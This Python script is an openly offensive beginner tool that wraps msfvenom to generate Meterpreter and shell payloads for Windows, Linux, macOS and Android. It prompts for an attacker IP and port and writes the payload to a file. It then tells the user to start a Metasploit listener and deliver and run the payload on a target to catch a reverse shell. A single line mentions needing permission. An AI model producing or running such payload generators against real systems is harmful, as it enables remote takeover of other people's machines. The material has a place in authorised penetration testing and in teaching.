import subprocess

# Color Class
class colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RESET = '\033[0m'

def explain_step(step, details):
    print(f"{colors.GREEN}[+] Step: {step}{colors.RESET}")
    print(f"{colors.YELLOW}[+] Details: {details}{colors.RESET}\n")

def main():
    print("""
          
          t
        @@@@@:  ..7@@@@@@@@@@@@@@@@@@@@@@B      &@@@@#     #@@@@@^ !@@@@@&                      !@@@@@@@@@7P
        @@@@@.    Y@@@@@&PPPGGGGGGPB##BB#?      :BBB##:   J&&&&&~  7@@@@@B                      J@@@@@@@@@@@
        @@@@#     P@@@@@J          :55YYY^       ~YGGGB^.~55YJY:   :GGGGGY                      G@@@@@@@@@@@
        BGPG5     B@@@@@!          ^JJ?7~. ^?PB&@@@@@@@@@@@@&5.     JYYYJY.            .~~^^^.  B&&&&@!.P@@@
        !~::.     #@@@@@:          ^!!!7?5&@@@@@@@@@@@@@@@@@@@#GY?: .?????7.          ^5PGGGG: .##&&&&:  :G&
                &@@@@@.          :?B@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@P!!!77??!^..  ..~JYYY5P5:  :#BBB#G     ~
                7Y5PG5           Y@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@G7^^!7!777777?JJJYYJ~    ~GGGGBY      
                                ?&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@P!::^~!!!777!!!^.      !P5PGG7      
                .YYJJJJ??7^   .J@@@@@@@@@@@@@@@@@@@&#&&GY&@@@@@@@@@@@@@@@&~    ...             ....:.      
        ..:.     ^&^^!!!!^#G ^Y@@@@@@@@@@@@@#G?7~...       .:~5#@@@@@@@@@@@@&^                              
                ~# ?@@@P BY P@@@@@@@@@@&Y:                    .^?Y@@@@@@@@@@@G^    . ^~:~~ ^7^~!~~^   :~~~^
                7B ?&&&Y #5#@@@@@@@@@&!                    .......^JB@@@@@@@@@?   ^:.~: .^7^: .~?. ^:...   
                ?B!!!!!~^&@@@@@@@@@#~                      ..........~G@@@@@@@@B^ .  ^::^.      ::. .::  ..
                .~~!!7777Y@@@@@@@@G.                       ..........::?&@@@@@@@@B......^..7. ^^^?~: .~  ?:
                Y##&&BY. &@@@@@@&!       .       .              ......:^~P@@@@@@@@Y^:.~: ~~::. ..:..:~7  . 
                Y#&7## ^B@@@@@@@~  .               .      ....:^^^::^:::.:!G#####@@J  .  ~~:.  !: ^^.~!:~7 
                ?&J##.#@@@@@@@7...               ......:!!:^~!!!7?Y55PP5Y?^   . !@#  .:.    ^!.^^     ...!
                .7J##J@@@@@@@P^:::.::^::.:::^~^:....:..::..:~JG&@@@@@@@@@@@@~   ~@@5.:.  ^^::....... .77!^
        :!!       JBB^!B@@@@@@#!:::::^~^^7^:...::....    .~~:...J@@@@@@@@@@@@@@. 5@@@@Y..:~!. :  ::~!~:^!!. 
        ...     .!!^ ~7#@BP?^:~?P#&@@@&JP@Y^.  ..     .  ^G&Y~~7&@@@@@@@@@@@@@@7 @@@@@@5J  ~  ^:  .... .... 
                .!G7..?! .  ^&@@@@@@&#&G&@GY~!!GB. :^^^: :@@@@@@@@@@@@@@@@@@@@@5.@@@@@&~7.~P?JY:.  ........:
                ?@&&#~5P    @@@@@@@@&5?#@@@@@@@@@^ ~:.:^^ !@@@@@@@@@@@@@@@@@@@@J^@@@@@#::^.  .::~^  :      .
                Y&P~!@@@&G  &@@@@@@@@@&@@@@@@@@@@..^::::^^.~@@@@@@@@@@@@@@@@@@@:P@@@@@@P^ ~: 7?^!!.    .^~~.
                .!7 :&G@@@& Y@@@@@@@@@@@@@@@@@@@G ^^::::^~!::G@@@@@@@@@@@@@@@&7:@@@@@@@&J~!^. ^J~:   .:~~:..
                ..:J!^P@@@@G &@@@@@@@@@@@@@@@@@&.^~^^:::^~~!~:~5#@@@@@@@@&#GYJJY&@@@@@&GJ~ .^^~~.     .::.. 
                ~:    5G@@@@5:@@@@@@@@@@@@@@@@B:^!~^::::^^!!!~~!!77???777!7?Y5?Y&@@@@@5? :PP?J7~^     .:.   
                !55...  5@@@@P:G@@@@@@@@@@@&G7~!~!7^::...:^77^^:::::::::...::^7Y&@@@@&PP~JG!~:^. :: ......  
                7~Y&5J? :&@@@@&7?Y55555YJ?7!!~^^^~7!^::..:^75J!?^.:::.....:::^75&@@@@&B#@#7.~^  ..^^.    .  
            .P^^#B5J575@@@@@#5J7~^::::::::..~!75GY7~!7JP&&#BP~:::::::.:::^~?P#@@@@@5J5@G7?~^^:  .  ...   
                ^: J^.PJJB@@@@&J^:.......:::..^YB#&&&#####&&&&#PJ7~^^^~^:::^~?5#@@@@@@&PB#PJ!:.^7^:..   ...
            .!... 7Y7777#@@@@G!^:::::::^:.:!?5#&&#BP5?PB#&&&@&#GYYJ?YYY!:^!?B@@@@@@&&&BBB#GG7 :~..:^:.   
            .~~GB7&J.~:7&@@@@&57~^::^~!^~JYGB##B&##BB#BBGG##B#&#G555GGP5^:7G#&@@@@@@#&#G5GGB&!^~  ^:..   
            .!5!..#G?Y7&@@&@&@&P7~:^!JY5PGBBB##BBGG5PPP##G5B#&&BB#BBPGGG5^?&#&&@@@&@@@@&#YG7?BJ^  ~:..   
            .!B?5YJ5GP#@@&@@@@@&B5!!B#B###B#B#&&@#B5YJJ#&#BBBGBG####&##B#5B#&&&@@@@&&@@&&&&PJ^!!..~^^^...
            . .JJ?7G&@@@@@@@@@@@@&P#@&&&&#GGB##&&#BY7!7??!~::^^~~~:!#&&&&B&&@@@@@@@&#&@@&BBGG?^: .^^.    
            .^~P!7?#&@@@@@@@@@@@@&&&&&GBJ~:^!?7~^::.........:::^:::~PB&&&&&#&@@@@@@&&#@@@@G~?BG7.  .     
                :7!!:5&@@@@@@@@@@@@@@@&&&&5J~:.:^!!!~^::::..::::^~^:::!G&##@@@@&&&@@@@@##&&&@&BJ??J~        
            7~^~?J&@@@@#G@@@@@&@@@@&@@&GPP?^:^^~!!!!!~!!!!!!~~!^::^Y&@@@@@&@@&&&&@@@BB&@B&&&#57^::.      
            .!YPGJG&@&##&P#@@@@@@@@@&@@@&&@&P~::^!!!!!?YYYY?!!7!~^^7P@@@@@@@@@@&@@@&@&&##GG&#&BP5!^.      
            ^Y55G#&@&#BGG&&@@@@@@@@@@@@@&@@@#GJ?7!~!J55PPBGY5G57?7YB#&@@@&@@@@@&@@&B&&GBBB5PGPGJ5^:~:.    
            .:?GB5G####&###@@@@@@@@@@@@@&@@@@&@&&&PPJJ5YBPJ?G?YPGJ5GB&&&@&@@&@@@@@&@@&@@###B575?B^?J^^..    
        .^^^JPGGG5B&&&#&&&&@@@@@@@@@@@@@@@&&&&&&&&G5GBGGGJYG5G#5G&&&&&&&&@&@@@@@@@@@&@@@@&&Y?JY7!!.       
        :^~YGYPBYJ##BYYGB#GB&@@@@@@@@@@@@@&&&&&@@&&G##BGPBG&&#&&&&&&&&#&&&@@@&@@@@@@@&&@@@@&P5!?7Y5?!^^   
        .7J5GB##5YBB#BGP##&&&&@&&@&&@@@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@&&@&&&@@@@&&@&&#&&&@@&&5~^J^77!7!^!?
        :JJGGGB##P&@#&BP?&@@@@@&&&@BB@@@&@&&&&@@                             &@@&@@&B@&##BPB&G#B&&J^PJ^:..:~YP
        PGPB#B&@&5&&B&#G#&@@@@&&@@&B@&@@&&&&&@   d8rh8r PlaceInvader lil'Red     @&@@@@@&&&&&#Y5Y&BJJP##PGP!::^:!??
        PG755G@&G5GY#&&&&@@@@@@@@@@&@&&&&&&@@@&@                             @@@@@&#&#&#575#&5Y#&&#5!^^~?:^!^
        ?Y^5JJJ5BPY~B#&G@@@&@&B&@@@@@@@@#&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#&&@@@@BG@##&&G#Y&##JG##Y55!^777Y7
        """)

    print(f"{colors.GREEN}[+] Welcome to the Fisher Price 'My First Payload'. You'll be popping shells in no time.{colors.RESET}")
    print(f"{colors.GREEN}[+] This script will guide you through creating a payload with MSFvenom.{colors.RESET}")
    # ... [Your ASCII Art Here] ...
    
    
    input(f"{colors.YELLOW}[+] Press Enter to continue....{colors.RESET}")

    payloads = {
        "1": "windows/meterpreter/reverse_tcp",
        "2": "windows/meterpreter/bind_tcp",
        "3": "linux/x86/meterpreter/reverse_tcp",
        "4": "osx/x64/shell_reverse_tcp",
        "5": "android/meterpreter/reverse_tcp"
    }

    for key, value in payloads.items():
        print(f"{colors.YELLOW}[+] {key}. {value}{colors.RESET}")
    
    choice = input(f"{colors.YELLOW}[+] Enter the number for the payload you wish to use: {colors.RESET}")
    payload = payloads.get(choice, None)

    if not payload:
        print(f"{colors.RED}[-] Invalid choice.{colors.RESET}")
        return

    lhost = input(f"{colors.YELLOW}[+] Enter LHOST (Your IP): {colors.RESET}")
    lport = input(f"{colors.YELLOW}[+] Enter LPORT (Listening Port): {colors.RESET}")
    format = input(f"{colors.YELLOW}[+] Enter the format for your payload (e.g., exe, elf, php, raw): {colors.RESET}")

    print(f"{colors.RED}[+] Note: Ensure that MSFvenom is in your system's PATH.{colors.RESET}")
    
    filename = f"payload.{format}"
    explain_step("4", "Generate the payload with the options you've selected.")
    
    try:
        result = subprocess.run(
            ["msfvenom", "-p", payload, "LHOST=" + lhost, "LPORT=" + lport, "-f", format, "-o", filename],
            capture_output=True,
            text=True,
            check=True
        )
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f"{colors.RED}An error occurred:{colors.RESET}", e)
    except Exception as e:
        print(f"{colors.RED}Unexpected error:{colors.RESET}", e)

    explain_step("5", f"Save the payload to a file named {filename}.")
    print(f"{colors.GREEN}[+] Payload saved as {filename}{colors.RESET}")

    explain_step("6", "Set up a listener using Metasploit's multi/handler with the same payload and options.")
    print(f"{colors.YELLOW}[+] You will need to manually configure Metasploit to listen for the incoming connection.{colors.RESET}")

    explain_step("7", "Deliver the payload to the target system and execute it. Your listener should catch the reverse shell.")
    print(f"{colors.GREEN}[+] Legal and ethical considerations: Always ensure you have explicit permission to use these tools on any network or system.{colors.RESET}")

    print(f"{colors.GREEN}[+] The MSFvenom wrapper script has completed.{colors.RESET}")

if __name__ == "__main__":
    main()
